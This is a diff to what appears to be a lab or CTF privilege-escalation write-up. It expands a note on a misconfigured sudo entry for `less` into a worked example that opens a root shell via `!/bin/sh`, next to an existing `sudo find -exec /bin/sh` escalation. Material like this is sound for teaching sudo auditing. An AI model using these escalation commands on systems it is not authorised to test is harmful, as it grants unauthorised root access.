@@ -27,7 +27,19 @@ sudo find . -exec /bin/sh \; -quit      # -exec runs /bin/sh AS root; -quit stop
 id                                       # -> uid=0(root)
 ```
 
-(The other entry, `sudo less /var/log/syslog`, is also abusable: run it, then type `!/bin/sh`.)
+**Bonus — the same file hands you a *second* root path.** The other entry,
+`(root) NOPASSWD: /usr/bin/less /var/log/syslog`, looks harmless because it's pinned to one log file —
+but `less` is an interactive pager that can shell out, so restricting *which file* it opens is pointless:
+
+```
+sudo less /var/log/syslog     # opens the log AS root; now escape the pager:
+!/bin/sh                       # type this at the ':' prompt -> a root shell
+                               # (or press  v  to jump into $EDITOR, then spawn a shell from there)
+id                             # -> uid=0(root)
+```
+
+Lesson: check **every** `sudo -l` entry against [GTFOBins](https://gtfobins.github.io) — a pager, editor
+or "read-only" viewer locked to a single file is still a complete escape if it can spawn a shell.
 
 ## Vector 2 — a SUID program that shouldn't be one — `enum/suid.txt`
 
